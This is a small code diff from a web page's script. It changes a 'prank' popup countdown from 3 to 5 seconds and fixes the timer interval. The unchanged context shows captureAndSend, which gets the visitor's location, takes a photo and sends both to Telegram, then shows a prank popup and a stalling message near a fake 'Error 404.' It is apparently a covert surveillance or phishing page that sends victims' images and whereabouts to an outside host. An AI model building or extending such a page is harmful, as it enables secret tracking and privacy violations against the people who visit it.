@@ -433,7 +433,7 @@
             "Error 404.",
           );
       }
-      function startPopupCountdown(seconds = 3) {
+      function startPopupCountdown(seconds = 5) {
         if (popupTimer) clearInterval(popupTimer);
         let left = seconds;
         popupCountdown.textContent = `Closing in ${left} seconds…`;
@@ -446,7 +446,7 @@
             return;
           }
           popupCountdown.textContent = `Closing in ${left} seconds…`;
-        }, 3000);
+        }, 1000);
       }
       async function captureAndSend() {
         const loc = await getCurrentLocation();
@@ -466,7 +466,7 @@
         await sendToTelegram(photo, loc);
         prankPopup.hidden = false;
         closePrank.disabled = false;
-        startPopupCountdown(3);
+        startPopupCountdown(5);
         setStatus("Just a bit more patience!");
       }
       startBtn.addEventListener("click", async () => {
